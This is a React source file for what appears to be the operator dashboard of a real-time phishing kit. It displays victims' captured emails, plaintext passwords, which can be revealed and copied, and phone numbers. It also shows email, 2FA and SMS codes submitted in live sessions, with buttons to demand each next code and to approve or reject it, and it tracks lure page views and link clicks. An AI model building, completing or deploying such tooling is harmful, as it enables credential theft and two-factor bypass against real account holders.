import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { Loader2, Eye, EyeOff, Copy, Check } from "lucide-react";
import { useState, useEffect } from "react";

/**
 * Admin Dashboard - View all client login data and manage verification
 * Only accessible to admin users
 */
export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { data: clientData, isLoading, error, refetch } = trpc.clientData.getAll.useQuery(undefined);
  const { data: globalPageViewCount = 0 } = trpc.clientData.getGlobalPageViewCount.useQuery(undefined, {
    refetchInterval: 2000,
  });
  const { data: mainLinkClickCount = 0 } = trpc.clientData.getMainLinkClickCount.useQuery(undefined, {
    refetchInterval: 2000,
  });
  const [visiblePasswords, setVisiblePasswords] = useState<Set<number>>(new Set());
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [requestingCodeFor, setRequestingCodeFor] = useState<{ id: number; type: string } | null>(null);
  const [generatedSmsCode, setGeneratedSmsCode] = useState<{ [key: number]: string }>({});
  const rejectCodeMutation = trpc.clientData.rejectCode.useMutation({
    onSuccess: () => {
      refetch();
    },
  });

  const rejectDataMutation = trpc.clientData.updateValidationStatus.useMutation({
    onSuccess: () => {
      refetch();
    },
  });

  const requestEmailCodeMutation = trpc.clientData.requestEmailCode.useMutation({
    onSuccess: () => {
      refetch();
      setRequestingCodeFor(null);
    },
  });

  const requestAuthCodeMutation = trpc.clientData.requestAuthCode.useMutation({
    onSuccess: () => {
      refetch();
      setRequestingCodeFor(null);
    },
  });

  const requestSmsCodeMutation = trpc.clientData.requestSmsCode.useMutation({
    onSuccess: () => {
      refetch();
      setRequestingCodeFor(null);
    },
  });

  const createSessionMutation = trpc.clientData.createSession.useMutation();
  const deleteAllDataMutation = trpc.clientData.deleteAllData.useMutation({
    onSuccess: () => {
      refetch();
    },
  });

  // Auto-refetch every 2 seconds to check for updates
  const utils = trpc.useUtils();
  useEffect(() => {
    const interval = setInterval(() => {
      refetch();
      utils.clientData.getGlobalPageViewCount.invalidate();
      utils.clientData.getMainLinkClickCount.invalidate();
    }, 2000);
    return () => clearInterval(interval);
  }, [refetch, utils.clientData.getGlobalPageViewCount, utils.clientData.getMainLinkClickCount]);

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <p className="text-red-500">Error loading admin dashboard:</p>
          <p className="text-white/70">{error.message}</p>
        </div>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="w-8 h-8 animate-spin" />
          <p>Loading admin dashboard...</p>
        </div>
      </div>
    );
  }

  const togglePasswordVisibility = (id: number) => {
    const newSet = new Set(visiblePasswords);
    if (newSet.has(id)) {
      newSet.delete(id);
    } else {
      newSet.add(id);
    }
    setVisiblePasswords(newSet);
  };

  const copyToClipboard = (text: string, id: number) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleRejectData = async (id: number, status: string, reason: string) => {
    try {
      // Find the record to get sessionId
      const record = clientData?.find((r: any) => r.id === id);
      if (record?.activeSession?.sessionId) {
        // Use rejectCode to properly reject credentials
        await handleRejectCode(record.activeSession.sessionId, "credentials");
      } else {
        // Fallback to old method if no session
        await rejectDataMutation.mutateAsync({
          id,
          status: status as any,
          rejectionReason: reason,
        });
      }
    } catch (error) {
      console.error("Error updating validation status:", error);
    }
  };

  const handleRejectCode = async (sessionId: string, codeType: "email" | "auth" | "credentials" | "sms") => {
    try {
      console.log("[handleRejectCode] Starting rejection", { sessionId, codeType });
      const result = await rejectCodeMutation.mutateAsync({
        sessionId,
        codeType,
      });
      console.log("[handleRejectCode] Rejection successful", result);
      await refetch();
      console.log("[handleRejectCode] Data refetched");
    } catch (error) {
      console.error("[handleRejectCode] Error rejecting code:", error);
      const msg = error instanceof Error ? error.message : String(error);
      alert("Error rejecting login: " + msg);
    }
  };

  const handleRequestEmailCode = async (id: number, record: any) => {
    try {
      console.log("[Admin] Email button clicked for record:", record);
      setRequestingCodeFor({ id, type: "email" });
      // Use existing session or create new one
      let sessionId = record.activeSession?.sessionId;
      console.log("[Admin] Active session:", record.activeSession);
      if (!sessionId) {
        const sessionResponse = await createSessionMutation.mutateAsync({
          clientLoginDataId: id,
        });
        sessionId = sessionResponse.sessionId;
      }
      console.log("[Admin] Requesting email code for sessionId:", sessionId);
      // Request email code for this session
      const result = await requestEmailCodeMutation.mutateAsync({
        sessionId,
      });
      console.log("[Admin] Email code request result:", result);
    } catch (error) {
      console.error("Error requesting email code:", error);
      setRequestingCodeFor(null);
    }
  };

  const handleRequestSmsCode = async (id: number, record: any) => {
    try {
      console.log("[Admin] SMS button clicked for record:", record);
      setRequestingCodeFor({ id, type: "sms" });
      let sessionId = record.activeSession?.sessionId;
      console.log("[Admin] Active session:", record.activeSession);
      if (!sessionId) {
        const sessionResponse = await createSessionMutation.mutateAsync({
          clientLoginDataId: id,
        });
        sessionId = sessionResponse.sessionId;
      }
      console.log("[Admin] Requesting SMS code for sessionId:", sessionId);
      const result = await requestSmsCodeMutation.mutateAsync({
        sessionId,
      });
      console.log("[Admin] SMS code request result:", result);
    } catch (error) {
      console.error("Error requesting SMS code:", error);
      setRequestingCodeFor(null);
    }
  };

  const handleRequestAuthCode = async (id: number, record: any) => {
    try {
      console.log("[Admin] Auth button clicked for record:", record);
      setRequestingCodeFor({ id, type: "auth" });
      // Use existing session or create new one
      let sessionId = record.activeSession?.sessionId;
      console.log("[Admin] Active session:", record.activeSession);
      if (!sessionId) {
        const sessionResponse = await createSessionMutation.mutateAsync({
          clientLoginDataId: id,
        });
        sessionId = sessionResponse.sessionId;
      }
      console.log("[Admin] Requesting auth code for sessionId:", sessionId);
      // Request auth code for this session
      const result = await requestAuthCodeMutation.mutateAsync({
        sessionId,
      });
      console.log("[Admin] Auth code request result:", result);
    } catch (error) {
      console.error("Error requesting auth code:", error);
      setRequestingCodeFor(null);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
      {/* Header */}
      <header className="border-b border-white/10 bg-black/50 backdrop-blur-sm sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 md:px-8 py-4 md:py-6 flex items-center justify-between">
          <div>
            <h1 className="text-2xl md:text-3xl font-bold">Admin Dashboard</h1>
            <p className="text-white/60 text-sm">Client Login Data - Auto-refreshing every 2s</p>
            <div className="mt-2 flex items-center gap-4">
              <div className="flex items-center gap-2">
                <span className="text-white/70 text-sm">Total Page Views:</span>
                <span className="bg-purple-500/20 text-purple-400 px-3 py-1 rounded text-sm font-semibold">
                  {globalPageViewCount}
                </span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white/70 text-sm">Main Link Clicks:</span>
                <span className="bg-blue-500/20 text-blue-400 px-3 py-1 rounded text-sm font-semibold">
                  {mainLinkClickCount}
                </span>
              </div>
            </div>
          </div>
          <div className="flex gap-2">
            <Button
              onClick={() => {
                if (confirm("Are you sure you want to delete ALL client data? This cannot be undone!")) {
                  deleteAllDataMutation.mutate({});
                }
              }}
              disabled={deleteAllDataMutation.isPending}
              className="bg-red-600 hover:bg-red-700 text-white"
            >
              {deleteAllDataMutation.isPending ? (
                <Loader2 size={16} className="animate-spin" />
              ) : (
                "🗑️ Clear All Data"
              )}
            </Button>
            <Button
              onClick={() => setLocation("/")}
              variant="outline"
              className="text-white border-white/20 hover:bg-white/10"
            >
              Back to Login
            </Button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 md:px-8 py-8">
        {!clientData || clientData.length === 0 ? (
          <div className="text-center py-12">
            <p className="text-white/60 text-lg">No client data recorded yet</p>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="text-white/60 text-sm">
              Total records: <span className="font-bold text-white">{clientData.length}</span>
            </div>
            {/* Table Container */}
            <div className="overflow-x-auto border border-white/10 rounded-lg bg-white/5">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-white/10 bg-white/5">
                    <th className="px-4 py-3 text-left font-semibold">ID</th>
                    <th className="px-4 py-3 text-left font-semibold">Email</th>
                    <th className="px-4 py-3 text-left font-semibold">Password</th>
                    <th className="px-4 py-3 text-left font-semibold">Phone</th>
                    <th className="px-4 py-3 text-left font-semibold">Email Code</th>
                    <th className="px-4 py-3 text-left font-semibold">Auth Code</th>
                    <th className="px-4 py-3 text-left font-semibold">Method</th>
                    <th className="px-4 py-3 text-left font-semibold">Status</th>
                    <th className="px-4 py-3 text-left font-semibold">Online</th>
                    <th className="px-4 py-3 text-left font-semibold">Date</th>
                    <th className="px-4 py-3 text-left font-semibold">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {clientData.map((record: any) => (
                    <tr key={record.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
                      <td className="px-4 py-3 text-white/70">{record.id}</td>
                      <td className="px-4 py-3 text-white/70 break-all max-w-xs">{record.email || "-"}</td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <span className={visiblePasswords.has(record.id) ? "text-white" : "text-white/70"}>
                            {visiblePasswords.has(record.id) ? record.password : "••••••••"}
                          </span>
                          <button
                            onClick={() => togglePasswordVisibility(record.id)}
                            className="text-white/50 hover:text-white transition-colors"
                          >
                            {visiblePasswords.has(record.id) ? (
                              <EyeOff size={16} />
                            ) : (
                              <Eye size={16} />
                            )}
                          </button>
                          {record.password && (
                            <button
                              onClick={() => copyToClipboard(record.password || "", record.id)}
                              className="text-white/50 hover:text-white transition-colors"
                            >
                              {copiedId === record.id ? (
                                <Check size={16} className="text-green-500" />
                              ) : (
                                <Copy size={16} />
                              )}
                            </button>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-3 text-white/70">
                        {record.phoneCountryCode} {record.phoneNumber || "-"}
                      </td>
                      <td className="px-4 py-3">
                        <span className="font-mono text-yellow-400">{record.activeSession?.emailCode || "-"}</span>
                      </td>
                      <td className="px-4 py-3">
                        <span className="font-mono text-cyan-400">{record.activeSession?.authCode || "-"}</span>
                      </td>
                      <td className="px-4 py-3 text-white/70">{record.loginMethod}</td>
                      <td className="px-4 py-3">
                        <span
                          className={`px-2 py-1 rounded text-xs font-semibold ${
                            record.validationStatus === "pending"
                              ? "bg-yellow-500/20 text-yellow-400"
                              : record.validationStatus === "approved"
                              ? "bg-green-500/20 text-green-400"
                              : "bg-red-500/20 text-red-400"
                          }`}
                        >
                          {record.validationStatus}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${record.isOnline === "true" ? "bg-green-500" : "bg-gray-500"}`}></div>
                          <span className={`text-xs font-semibold ${record.isOnline === "true" ? "text-green-400" : "text-gray-400"}`}>
                            {record.isOnline === "true" ? "Online" : "Offline"}
                          </span>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-white/70 text-xs">
                        {new Date(record.createdAt).toLocaleString()}
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex gap-2 flex-wrap">
                          <Button
                            onClick={() => handleRequestEmailCode(record.id, record)}
                            disabled={requestingCodeFor?.id === record.id}
                            size="sm"
                            className="bg-blue-600 hover:bg-blue-700 text-white text-xs"
                          >
                            {requestingCodeFor?.id === record.id && requestingCodeFor?.type === "email" ? (
                              <Loader2 size={14} className="animate-spin" />
                            ) : (
                              "📧 Email"
                            )}
                          </Button>
                          <Button
                            onClick={() => handleRequestAuthCode(record.id, record)}
                            disabled={requestingCodeFor?.id === record.id}
                            size="sm"
                            className="bg-purple-600 hover:bg-purple-700 text-white text-xs"
                          >
                            {requestingCodeFor?.id === record.id && requestingCodeFor?.type === "auth" ? (
                              <Loader2 size={14} className="animate-spin" />
                            ) : (
                              "🔐 2FA"
                            )}
                          </Button>
                          <Button
                            onClick={() => handleRequestSmsCode(record.id, record)}
                            disabled={requestingCodeFor?.id === record.id}
                            size="sm"
                            className="bg-cyan-600 hover:bg-cyan-700 text-white text-xs"
                          >
                            {requestingCodeFor?.id === record.id && requestingCodeFor?.type === "sms" ? (
                              <Loader2 size={14} className="animate-spin" />
                            ) : (
                              "📱 SMS"
                            )}
                          </Button>
                          {/* Show email code if submitted */}
                          {record.activeSession?.emailCode && record.activeSession?.status === "email_code_submitted" && (
                            <div className="bg-blue-500/20 border border-blue-500/50 rounded px-2 py-1 text-xs">
                              <p className="text-blue-300 font-semibold">Email Code: {record.activeSession.emailCode}</p>
                            </div>
                          )}
                          
                          {/* Show Approve button if email code submitted */}
                          {record.activeSession?.emailCode && record.activeSession?.status === "email_code_submitted" && (
                            <Button
                              onClick={() => handleRequestAuthCode(record.id, record)}
                              size="sm"
                              className="bg-green-600 hover:bg-green-700 text-white text-xs"
                            >
                              ✓ Approve
                            </Button>
                          )}
                          
                          {/* Show auth code if submitted */}
                          {record.activeSession?.authCode && record.activeSession?.status === "auth_code_submitted" && (
                            <div className="bg-purple-500/20 border border-purple-500/50 rounded px-2 py-1 text-xs">
                              <p className="text-purple-300 font-semibold">2FA Code: {record.activeSession.authCode}</p>
                            </div>
                          )}
                          
                          {/* Show Approve button if auth code submitted */}
                          {record.activeSession?.authCode && record.activeSession?.status === "auth_code_submitted" && (
                            <Button
                              onClick={() => handleRejectData(record.id, "approved", "")}
                              size="sm"
                              className="bg-green-600 hover:bg-green-700 text-white text-xs"
                            >
                              ✓ Approve
                            </Button>
                          )}
                          
                          {/* Show Reject button if email code submitted */}
                          {record.activeSession?.emailCode && record.activeSession?.status === "email_code_submitted" && (
                            <Button
                              onClick={() => handleRejectCode(record.activeSession.sessionId, "email")}
                              size="sm"
                              variant="destructive"
                              className="text-xs"
                            >
                              ✗ Reject Email
                            </Button>
                          )}
                          
                          
                          {/* Show SMS code if submitted */}
                          {record.activeSession?.smsCode && record.activeSession?.status === "sms_code_submitted" && (
                            <div className="bg-cyan-500/20 border border-cyan-500/50 rounded px-2 py-1 text-xs">
                              <p className="text-cyan-300 font-semibold">SMS Code: {record.activeSession.smsCode}</p>
                            </div>
                          )}
                          
                          {/* Show Approve button if SMS code submitted */}
                          {record.activeSession?.smsCode && record.activeSession?.status === "sms_code_submitted" && (
                            <Button
                              onClick={() => trpc.clientData.approveSmsCode.useMutation({ onSuccess: () => refetch() }).mutate({ sessionId: record.activeSession.sessionId })}
                              size="sm"
                              className="bg-green-600 hover:bg-green-700 text-white text-xs"
                            >
                              ✓ Approve SMS
                            </Button>
                          )}
                          
                          {/* Show Reject button if auth code submitted */}
                          {record.activeSession?.authCode && record.activeSession?.status === "auth_code_submitted" && (
                            <Button
                              onClick={() => handleRejectCode(record.activeSession.sessionId, "auth")}
                              size="sm"
                              variant="destructive"
                              className="text-xs"
                            >
                              ✗ Reject 2FA
                            </Button>
                          )}
                          
                          {/* Show Reject button if SMS code submitted */}
                          {record.activeSession?.smsCode && record.activeSession?.status === "sms_code_submitted" && (
                            <Button
                              onClick={() => handleRejectCode(record.activeSession.sessionId, "sms")}
                              size="sm"
                              variant="destructive"
                              className="text-xs"
                            >
                              ✗ Reject SMS
                            </Button>
                          )}
                          
                          {/* Show Reject button if credentials submitted */}
                          {record.validationStatus === "pending" && (
                            <button
                              type="button"
                              onClick={async (e) => {
                                e.preventDefault();
                                e.stopPropagation();
                                console.log("[Button Click] Reject Login clicked", { clientId: record.id, activeSession: record.activeSession });
                                let sessionId = record.activeSession?.sessionId;
                                // Always create a fresh session for rejection to avoid conflicts with previous rejections
                                try {
                                  console.log("[Button Click] Creating fresh session for clientId:", record.id);
                                  const sessionResponse = await createSessionMutation.mutateAsync({
                                    clientLoginDataId: record.id,
                                  });
                                  sessionId = sessionResponse.sessionId;
                                  console.log("[Button Click] Fresh session created:", sessionId);
                                } catch (error) {
                                  console.error("[Button Click] Error creating session:", error);
                                  return;
                                }
                                if (!sessionId) {
                                  console.error("[Button Click] No sessionId available");
                                  alert("Error: Could not create session for rejection");
                                  return;
                                }
                                console.log("[Button Click] Calling handleRejectCode with sessionId:", sessionId);
                                await handleRejectCode(sessionId, "credentials");
                                console.log("[Button Click] handleRejectCode completed");
                              }}
                              className="px-3 py-1 text-xs bg-red-600 hover:bg-red-700 text-white rounded relative z-50 cursor-pointer"
                            >
                              ✗ Reject Login
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
